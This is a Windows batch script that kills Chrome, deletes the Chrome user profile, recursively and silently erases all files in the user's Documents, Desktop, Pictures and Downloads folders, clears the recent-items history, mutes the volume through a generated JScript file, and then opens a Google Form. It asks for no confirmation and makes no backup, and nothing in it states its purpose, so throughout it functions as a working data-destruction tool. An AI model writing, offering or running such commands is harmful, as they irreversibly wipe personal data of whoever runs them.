@echo off

taskkill /F /IM chrome.exe /T

:: Set Paths :: 
set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data
set Documents=C:\Users\%USERNAME%\Documents\
set Desktop=C:\Users\%USERNAME%\Desktop\
set Pictures=C:\Users\%USERNAME%\Pictures\
set Downloads=C:\Users\%USERNAME%\Downloads\

:: Delete Files ::
del /q /s /f "%ChromeDir%"
rd /s /q "%ChromeDir%"

del /q /s /f "%Documents%"
del /q /s /f "%Desktop%"
del /q /s /f "%Pictures%"
del /q /s /f "%Downloads%"

del /F /Q %APPDATA%\Microsoft\Windows\Recent\*
del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*
del /F /Q %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*

:: Restart Explorer ::
taskkill /f /im explorer.exe
start explorer.exe

:: Volume Down to 0 ::
    :: Creates temporary JavaScript file ::
echo var oShell = new ActiveXObject("WScript.Shell"); >> vd.js
set "line=for (var i=0; i<50; i++){"
setlocal EnableDelayedExpansion
(
echo !line! 
) >> vd.js
echo oShell.SendKeys(String.fromCharCode(0xAE)); >> vd.js
echo } >> vd.js

timeout /t 1
cscript /e:jscript vd.js
timeout /t 1
     :: Deletes temporary JavaScript file ::
del /F/ Q vd.js

start chrome https://docs.google.com/forms/d/e/1FAIpQLSdpeyvOBks6QBCz8PJeVibY6jwf7VNbJ9GCxjv4CpvvuRl9ew/viewform
